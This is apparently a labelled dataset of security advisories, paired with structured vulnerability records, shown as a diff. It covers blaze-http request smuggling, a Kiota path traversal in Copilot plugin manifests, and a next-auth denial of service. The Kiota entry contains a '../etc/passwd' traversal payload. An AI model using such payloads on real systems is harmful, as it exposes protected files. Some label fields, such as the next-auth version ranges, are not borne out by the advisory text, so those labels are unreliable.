+              "product": "org.http4s:blaze-http_2.13",
+              "version_range": ">= 1.0.0-M1, <= 1.0.0-M41"
+            },
+            {
+              "vendor": "MAVEN",
+              "product": "org.http4s:blaze-http_3",
+              "version_range": ">= 1.0.0-M1, < 1.0.0-M42"
+            },
+            {
+              "vendor": "MAVEN",
+              "product": "org.http4s:blaze-http_3",
+              "version_range": "<= 0.23.17"
+            },
+            {
+              "vendor": "MAVEN",
+              "product": "org.http4s:blaze-http_2.12",
+              "version_range": "<= 0.23.17"
+            },
+            {
+              "vendor": "MAVEN",
+              "product": "org.http4s:blaze-http_2.13",
+              "version_range": "<= 0.23.17"
+            }
+          ],
+          "cwe_category": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "An attacker can spoof client IP, forge 'https' scheme, and inject internal-auth headers.",
+          "remediation_action": "Deploy behind a proxy that removes trailer fields (or rejects requests that use trailers) before forwarding"
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-4jwf-m4wg-8p66",
+    "input_text": "### Summary\n\n`kiota plugin add` / `kiota plugin generate` (with `-t APIPlugin`) emits an attacker-controlled `static_template.file` path from the AI-plugin extensions (`x-ai-adaptive-card`, `x-ai-capabilities`) **verbatim**, with no path validation, into the generated Microsoft 365 Copilot / Teams plugin manifest (`<name>-apiplugin.json`). An attacker-controlled or compromised OpenAPI description can therefore embed a `../` / absolute path into the manifest's `response_semantics.static_template.file`, yielding a **path traversal (CWE-22)** / out-of-package file inclusion (CWE-829) that is resolved by the AI host when the generated plugin is deployed.\n\nConfirmed on Kiota **1.32.4** (`KIOTA_CONFIG_PREVIEW=true`, the self-contained `linux-x64` release binary).\n\n### Details\n\nBoth extension paths write the `static_template.file` reference straight into the manifest without sanitization \u2014 `PluginsGenerationService.GetResponseSemanticsFromAdaptiveCardExtension` mints `static_template = {\"file\": <File>}`, and the `x-ai-capabilities` path copies the `static_template` object through:\n\n```\n# spec                                                  -> generated manifest (functions[].capabilities.response_semantics)\nx-ai-adaptive-card: {title: T, data_path: $.x,\n   file: \"../../../../../../etc/passwd\"}                -> static_template.file = \"../../../../../../etc/passwd\"   (CWE-22)\nx-ai-capabilities.response_semantics.static_template:\n   {file: \"../../../../../../etc/passwd\"}               -> static_template.file = \"../../../../../../etc/passwd\"   (CWE-22)\n```\n\n(`x-ai-adaptive-card.file` only reaches the manifest when `title` is set, so `GetResponseSemanticsFromAdaptiveCardExtension` fires; otherwise kiota writes its own template card instead.)\n\n### Impact\n\n**This is not local code execution on the build host.** The injected path is written into the generated plugin manifest and realized **downstream**, when the plugin is packaged and sideloaded / deployed to an AI host (Microsoft 365 Copilot / Teams) that resolves `static_template.file` relative to the plugin package (out-of-package file reference via `../`). Kiota is the propagation point: it fails to reject `../` and absolute paths in this provider-supplied field before writing it into the manifest.\n\n### Patches\n\nFixed in **1.32.5** (https://github.com/microsoft/kiota/pull/7892). `static_template.file` from both `x-ai-adaptive-card` and `x-ai-capabilities` is validated as a relative path confined to the plugin output package: absolute URIs, rooted/UNC paths, Windows drive paths, and `..` traversal segments are rejected, and unsafe references are dropped with a warning. Regression tests cover `..`, absolute paths, and URI values.\n\n### Remediation\n\nUpgrade to Kiota **1.32.5** or later and regenerate affected plugins.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59864",
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Microsoft.OpenApi.Kiota.Builder",
+              "version_range": "< 1.32.5"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Microsoft.OpenApi.Kiota",
+              "version_range": "< 1.32.5"
+            }
+          ],
+          "cwe_category": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+          "severity": "critical",
+          "attack_vector": "unknown",
+          "impact_summary": "An attacker can control a file inclusion vulnerability via static template path in Microsoft 365 Copilot / Teams plugins.",
+          "remediation_action": "Upgrade to Kiota 1.32.5 or later and regenerate affected plugins."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-xmf8-cvqr-rfgj",
+    "input_text": "## Summary\n\nThe exported `getToken()` helper (`next-auth/jwt` and `@auth/core/jwt`) can throw an uncaught exception when it reads a malformed `Authorization: Bearer \u2026` header. When no session cookie is present, `getToken()` URL-decodes the bearer value before validating it, and malformed percent-encoding causes the decode step to throw rather than being treated as an invalid token. Because `getToken()` is commonly called in API routes, middleware, and other request handlers, a single unauthenticated request can trigger an unhandled exception in code paths that authenticate requests.\n\n## Am I affected?\n\nYou are affected if **all** of the following hold:\n\n- You use `next-auth` `<= 5.0.0-beta.25` (or `@auth/core` exposing the same `getToken()` implementation).\n- Your application calls `getToken()` directly \u2014 for example in a Route Handler, middleware, or server-side request handler.\n- You do not wrap that `getToken()` call in your own `try/catch`.\n\nYou are **not** affected if you only use the framework's `auth()` helper and never call `getToken()` yourself, or if every `getToken()` call site already has its own exception handling.\n\n## Impact\n\n- Denial of service: an unauthenticated request carrying a malformed Bearer authorization header can raise an unhandled exception in any handler that calls `getToken()`.\n- The impact is per-request and limited to availability; it does not expose tokens, sessions, or other data, and does not bypass authentication.\n\nCWE-20: Improper Input Validation.\n\n## Patched version\n\nThe fix makes `getToken()` treat a malformed Bearer value as an invalid token and return `null`, matching how other undecodable tokens are already handled. Upgrade to the first release containing this fix (to be published; this advisory will be updated with the exact patched version before publication) and no code changes are required.\n\n## Workarounds\n\nIf you cannot upgrade immediately, either:\n\n- **Config/code-level:** wrap your `getToken()` calls so a thrown error is treated as \"no token\", e.g.\n\n  ```ts\n  let token = null\n  try {\n    token = await getToken({ req, secret })\n  } catch {\n    token = null\n  }\n  ```\n\n- Or strip/normalize the incoming `Authorization` header at the edge (proxy, middleware) before it reaches `getToken()`, rejecting values whose Bearer portion is not valid percent-encoding.\n\n## Credit\n\nReported by @deprrous. Thank you for the responsible disclosure.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "next-auth",
+              "version_range": ">= 4.0.6, <= 4.24.14"
+            },
+            {
+              "vendor": "NPM",
+              "product": "next-auth",
+              "version_range": ">= 5.0.0-beta.0, <= 5.0.0-beta.31"
+            },
+            {
+              "vendor": "NPM",
+              "product": "@auth/core",
+              "version_range": ">= 0.1.0, < 0.41.3"
+            }
+          ],
+          "cwe_category": "Improper Input Validation",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "Denial of Service: Malformed Bearer headers can cause unauthenticated requests to throw exceptions.",
+          "remediation_action": "Upgrade to the first release containing the fix that makes `getToken()` treat malformed Bearer values as invalid and return `null`."
+        }
+      ]
+    }
+  }
+]
